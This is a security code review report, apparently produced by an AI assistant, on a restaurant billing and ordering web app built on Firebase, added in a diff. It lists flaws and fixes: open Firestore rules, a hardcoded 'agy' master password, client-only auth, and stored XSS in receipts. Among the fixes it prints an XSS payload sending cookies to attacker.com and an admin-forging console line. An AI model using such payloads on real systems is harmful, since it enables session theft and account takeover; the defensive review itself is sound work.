@@ -1,0 +1,254 @@
+As a Senior Software & Security Engineer, I have performed a deep-dive architecture and code review of this codebase.                                 
+                                                                                                                                                        
+  Because this application handles financial transactions (billing, payments, cash register), staff credentials, and customer dining data, it cannot    
+  safely be deployed to production in its current state.                                                                                                
+                                                                                                                                                        
+  Below is the comprehensive vulnerability report categorized by severity, detailing root causes, exploit scenarios, and the concrete remediations      
+  required before going live.                                                                                                                           
+  ──────                                                                                                                                                
+  ## 🚨 Critical Vulnerabilities (Must Fix Before Production)                                                                                           
+  ──────                                                                                                                                                
+  ### 1. Unauthenticated Read/Write Access to User Accounts in Firestore                                                                                
+                                                                                                                                                        
+  • Location: firestore.rules:69-72                                                                                                                     
+    // 8. User Accounts (Admin & Staff)                                                                                                                 
+    match /users/{userId} {                                                                                                                             
+      allow read, write: if true;                                                                                                                       
+    }                                                                                                                                                   
+                                                                                                                                                        
+  • Vulnerability: Complete authorization bypass (CWE-284).                                                                                             
+  • Exploit Scenario:                                                                                                                                   
+  Any anonymous internet user who extracts the Firebase configuration can use the public Firestore SDK in their browser console to query all user       
+  accounts (including password hashes and roles), create a new account with role: 'admin', or wipe the entire users collection.                         
+  • Production Fix:                                                                                                                                     
+      • Implement Firebase Auth or a server-side authentication proxy (Firebase Admin SDK / Cloud Functions).                                           
+      • Restrict /users so only verified administrators can write, and users cannot read other users' password hashes:                                  
+        match /users/{userId} {                                                                                                                         
+          allow read, write: if request.auth != null && request.auth.token.role == 'admin';                                                             
+        }                                                                                                                                               
+                                                                                                                                                        
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 2. Hardcoded Master Password & Information Disclosure                                                                                             
+                                                                                                                                                        
+  • Location:                                                                                                                                           
+      • db.ts:935-946                                                                                                                                   
+      • Login.tsx:336-358                                                                                                                               
+      • Login.tsx:535                                                                                                                                   
+  • Vulnerability: Hardcoded Credentials (CWE-798) and Sensitive Information Exposure (CWE-200).                                                        
+  • Code Snippet:                                                                                                                                       
+    if (allUsers.length === 0) {                                                                                                                        
+      if (cleanPassword === 'agy') {                                                                                                                    
+        const adminUser = userDB.create({                                                                                                               
+          username: cleanUsername || 'admin',                                                                                                           
+          password: 'agy',                                                                                                                              
+          role: 'admin',                                                                                                                                
+          isActive: true,                                                                                                                               
+        });                                                                                                                                             
+        return { user: adminUser, error: undefined };                                                                                                   
+      }                                                                                                                                                 
+      return { user: null, error: 'No accounts exist yet. Master password is "agy" for initial administrator login.' };                                 
+    }                                                                                                                                                   
+                                                                                                                                                        
+  • Exploit Scenario:                                                                                                                                   
+  The UI explicitly advertises the master password on the sign-in button: Sign In as Admin (Master Password: agy) and in the error message. If the      
+  database is new or wiped, anyone can log in and claim the system.                                                                                     
+  • Production Fix:                                                                                                                                     
+      • Remove the hardcoded "agy" master password entirely.                                                                                            
+      • Provide a secure, one-time initial setup CLI or protected bootstrap screen where the system administrator creates their own initial password.   
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 3. Client-Side Only Authentication & Authorization (Zero Backend Enforcement)                                                                     
+                                                                                                                                                        
+  • Location: AuthContext.tsx:32-58, access.ts:13-37                                                                                                    
+  • Vulnerability: Client-Side Enforcement of Server-Side Security (CWE-602).                                                                           
+  • Root Cause:                                                                                                                                         
+      • The application performs user authentication solely in client-side memory using bcrypt.compareSync against an in-memory array of users.         
+      • Real Firebase Authentication (signInWithEmailAndPassword, signInWithCustomToken) is never invoked. As a result, request.auth in Firestore is    
+      permanently null.                                                                                                                                 
+      • Any Firestore security rule requiring isAuthenticated() (request.auth != null) will either reject all staff writes or must be left open (if     
+      true).                                                                                                                                            
+  • Exploit Scenario:                                                                                                                                   
+  Any user can open React DevTools or browser console and run:                                                                                          
+    setUser({ id: 'hacker', username: 'attacker', role: 'admin', isActive: true });                                                                     
+  The UI immediately unlocks all administrative panels, reports, employee records, and settings.                                                        
+  • Production Fix:                                                                                                                                     
+      • Integrate true server-side token-based authentication (Firebase Auth, Supabase, or a Node.js/JWT backend).                                      
+      • Enforce role-based access control (RBAC) via Firebase Auth Custom Claims (request.auth.token.role) or server-side API middleware.               
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 4. Stored Cross-Site Scripting (XSS) in Receipt & QR Code Printing                                                                                
+                                                                                                                                                        
+  • Location:                                                                                                                                           
+      • printInvoice.ts:46-110                                                                                                                          
+      • QRCodeModal.tsx:26-60                                                                                                                           
+  • Vulnerability: Stored Cross-Site Scripting (CWE-79).                                                                                                
+  • Root Cause:                                                                                                                                         
+  In printInvoice.ts:95-107, customer-controlled strings are interpolated directly into raw HTML passed to invoiceWindow.document.write(...):           
+    <p>${order.customerName || 'Walk-in Customer'}</p>                                                                                                  
+    <p>${order.notes}</p>                                                                                                                               
+    <div style="font-weight:600;">${item.menuItemName}</div>                                                                                            
+                                                                                                                                                        
+  • Exploit Scenario:                                                                                                                                   
+  A customer ordering from the QR menu sets their name or notes to:                                                                                     
+    <img src=x onerror="fetch('https://attacker.com/steal?data='+btoa(document.cookie))">                                                               
+  When the cashier or waiter clicks "Print Receipt / Bill Ticket", the script executes in the context of the staff session.                             
+  • Production Fix:                                                                                                                                     
+      • Escape all dynamic values using a sanitization function or HTML entity encoder before passing to document.write:                                
+        function escapeHtml(str: string = ''): string {                                                                                                 
+          return str.replace(/[&<>"']/g, (m) => ({                                                                                                      
+            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'                                                                        
+          }[m]!));                                                                                                                                      
+        }                                                                                                                                               
+                                                                                                                                                        
+      • Or print receipts via a hidden React-rendered portal without document.write.                                                                    
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 5. Embedded Cloud Credentials in Client Bundle                                                                                                    
+                                                                                                                                                        
+  • Location: firebaseConfig.ts:14-50                                                                                                                   
+  • Vulnerability: Security through Obscurity / Key Extraction (CWE-798).                                                                               
+  • Root Cause:                                                                                                                                         
+  Firebase credentials (apiKey: "AIzaSy...", projectId: "myapp-970f1") are obfuscated with a simple XOR vector (_SECRET_KEY =                           
+  'RMS_SECURE_CLOUD_VECTOR_2026') and compiled directly into the production JS bundle.                                                                  
+  • Exploit Scenario:                                                                                                                                   
+  XOR masking is not encryption. Any automated scanner or developer running strings on dist/assets/index-*.js can reconstruct the keys in seconds.      
+  • Production Fix:                                                                                                                                     
+      • While Firebase API keys are technically public identifiers, they must be paired with strict Firestore Security Rules and App Check.             
+      • Enable Firebase App Check (reCAPTCHA v3 or Play Integrity) in the Firebase Console to ensure only legitimate requests from your registered      
+      domain or APK can talk to Firestore.                                                                                                              
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ## ⚠️ High Vulnerabilities (Operational & Data Integrity Risks)                                                                                       
+  ──────                                                                                                                                                
+  ### 6. Public Unauthenticated Read Access to Orders & Payments                                                                                        
+                                                                                                                                                        
+  • Location: firestore.rules:40-47                                                                                                                     
+    match /orders/{orderId} {                                                                                                                           
+      allow read, create: if true;                                                                                                                      
+      allow update, delete: if isAuthenticated();                                                                                                       
+    }                                                                                                                                                   
+    match /payments/{paymentId} {                                                                                                                       
+      allow read: if true;                                                                                                                              
+      allow write: if isAuthenticated();                                                                                                                
+    }                                                                                                                                                   
+                                                                                                                                                        
+  • Vulnerability: Sensitive Data Exposure (CWE-200).                                                                                                   
+  • Impact: Anyone can query the /orders and /payments collections to view all revenue, transaction history, customer names, table assignments, and     
+  staff information.                                                                                                                                    
+  • Production Fix:                                                                                                                                     
+      • Restrict read access to orders and payments so customers can only read their own active table order, and all financial totals are protected     
+      behind authenticated staff roles.                                                                                                                 
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 7. Unrestricted Table Creation & Denial of Service via QR URL                                                                                     
+                                                                                                                                                        
+  • Location: CustomerOrder.tsx:73-84                                                                                                                   
+    let t = tableDB.getAll().find((tbl) => tbl.number === tableNumber);                                                                                 
+    if (!t) {                                                                                                                                           
+      t = tableDB.create({                                                                                                                              
+        number: tableNumber,                                                                                                                            
+        capacity: 4,                                                                                                                                    
+        status: 'occupied',                                                                                                                             
+        qrCode: `?table=${tableNumber}`,                                                                                                                
+      });                                                                                                                                               
+    }                                                                                                                                                   
+                                                                                                                                                        
+  • Vulnerability: Resource Exhaustion / Denial of Service (CWE-400).                                                                                   
+  • Exploit Scenario:                                                                                                                                   
+  A customer or bot visiting ?table=99999 causes the app to automatically create a table in the database and push it to Firestore. A basic loop visiting
+  ?table=1 to ?table=5000 floods the database with thousands of phantom occupied tables, locking out legitimate floor management.                       
+  • Production Fix:                                                                                                                                     
+      • Do not auto-create tables on customer scan.                                                                                                     
+      • If a table number does not exist in tableDB.getAll(), render a clean error: "Invalid Table. Please ask your server for assistance."             
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 8. Client-Side Price & Total Trust (Price Tampering)                                                                                              
+                                                                                                                                                        
+  • Location: CustomerOrder.tsx:329-373                                                                                                                 
+  • Vulnerability: Parameter Tampering / Lack of Server-Side Price Verification (CWE-472).                                                              
+  • Root Cause:                                                                                                                                         
+  When a customer submits an order, prices, subtotals, tax, and totals are computed in the customer's browser and sent directly to orderDB.create(...) /
+  Firestore.                                                                                                                                            
+  • Exploit Scenario:                                                                                                                                   
+  A user can intercept the network request or alter client variables to place an order where expensive items have unitPrice: 1 and total: 1. The kitchen
+  prepares the food, and the bill is generated for ¥1.                                                                                                  
+  • Production Fix:                                                                                                                                     
+      • Always recalculate order totals against canonical item prices stored in the database on order receipt. Never trust client-provided totals.      
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ### 9. Insecure Backup Export / Import                                                                                                                
+                                                                                                                                                        
+  • Location: db.ts:1872-1919                                                                                                                           
+  • Vulnerabilities:                                                                                                                                    
+      • Export: Dumps all employee phone numbers, salaries, and password hashes into an unencrypted plaintext .json file downloaded to disk.            
+      • Import: Executes JSON.parse and directly overwrites all collections (users, settings, tables, orders) with zero schema validation or role       
+      validation.                                                                                                                                       
+  • Production Fix:                                                                                                                                     
+      • Strip password hashes and PII from public export dumps.                                                                                         
+      • Validate imported JSON against a strict Zod/TypeScript schema before applying changes to memory and Firestore.                                  
+                                                                                                                                                        
+  ──────                                                                                                                                                
+  ## 🔍 Medium & Architectural Deficiencies                                                                                                             
+  ──────                                                                                                                                                
+  ### 10. In-Memory Login Rate Limiting (Trivial Bypass)                                                                                                
+                                                                                                                                                        
+  • Location: db.ts:745-827                                                                                                                             
+  • Root Cause: authRateLimiter keeps failed attempts in a local memory variable memoryRateLimits.                                                      
+  • Exploit: A brute-force attacker can refresh the browser or open a new incognito window to reset the lockout counter instantly.                      
+  • Production Fix: Move rate limiting to a persistent backend tier (e.g., Firebase Authentication built-in brute force protection or Cloudflare Rate   
+  Limiting).                                                                                                                                            
+  ──────                                                                                                                                                
+  ### 11. Concurrency Race Conditions & Last-Write-Wins Data Overwrite                                                                                  
+                                                                                                                                                        
+  • Location: firebaseSync.ts:109-114, firebaseSync.ts:165-175                                                                                          
+  • Root Cause:                                                                                                                                         
+      • The cloud sync engine replaces entire collection arrays whenever a snapshot fires:                                                              
+      cloudUpdateHandler.setCollection(collName, items)                                                                                                 
+      • Document updates use setDoc(docRef, data, { merge: true }) without transaction locking or optimistic concurrency (runTransaction).              
+  • Impact:                                                                                                                                             
+  If two waiters place an order or the kitchen marks an item "ready" while a waiter modifies the table notes, the second write silently overwrites the  
+  first write's updates.                                                                                                                                
+  • Production Fix: Use Firestore runTransaction or granular field updates (updateDoc) with revision timestamps/versions.                               
+  ──────                                                                                                                                                
+  ### 12. External Data Leakage via 3rd-Party QR Generator                                                                                              
+                                                                                                                                                        
+  • Location: QRCodeModal.tsx:51                                                                                                                        
+    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent('${orderUrl}');                                     
+  
+  • Root Cause: Sends table ordering URLs to an external 3rd-party domain (api.qrserver.com), even though qrcode.react is already installed in          
+  node_modules.
+  • Production Fix: Render QR codes locally using QRCodeSVG from qrcode.react (offline-safe, zero third-party leakage).
+  ──────
+  ### 13. Hidden Easter Egg Modal on Login Screen
+  
+  • Location: Login.tsx:135-165, Login.tsx:551-600
+  • Issue: Clicking the 4 corners of the login screen opens the Cloud Configuration modal, exposing Firebase credentials and a "Disconnect Cloud" button.
+  • Production Fix: Remove the 4-corner Easter egg from production builds; restrict cloud connection management exclusively to authenticated            
+  Administrators in the Settings page.
+  ──────
+  ### 14. Missing Content Security Policy (CSP) & Reversible Password Fallback
+  
+  • Location: index.html, db.ts:709
+  • Issues:
+      • index.html has no Content-Security-Policy (CSP) header, exposing the app to script injection and unauthorized outbound connections.             
+      • In safeHashPassword, if bcrypt fails, the fallback is btoa(password) (reversible base64 encoding rather than a cryptographically secure hash).  
+  
+  ──────
+  ## 📋 Prioritized Production Remediation Checklist
+  
+   Priority       │ Area                     │ Required Action
+  ────────────────┼──────────────────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────
+   P0             │ Firestore Rules          │ Secure /users in firestore.rules; forbid public read/write of accounts.
+   P0             │ Master Password          │ Remove hardcoded "agy" password from db.ts and Login.tsx.
+   P0             │ XSS Prevention           │ Escape dynamic values in printInvoice.ts and QRCodeModal.tsx.
+   P0             │ Authentication           │ Replace client-side mock auth with real Firebase Authentication + Custom Claims.
+   P1             │ Order & Price Validation │ Calculate order subtotals and tax against database prices on the receiving side; reject unknown tables.
+   P1             │ Table Protection         │ Stop auto-creating tables in CustomerOrder.tsx; show an error for non-existent table numbers.
+   P1             │ Data Isolation           │ Restrict /orders and /payments Firestore rules so unauthenticated visitors cannot read restaurant sales.
+   P2             │ App Check                │ Enable Firebase App Check to block unauthorized API key usage from outside your domain/app.
+   P2             │ Concurrency              │ Transition from full-collection overwrites in firebaseSync.ts to granular document updates (updateDoc).
+   P2             │ Backup Hardening         │ Sanitize exports (omit password hashes) and validate schema on backup import.
+
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+>
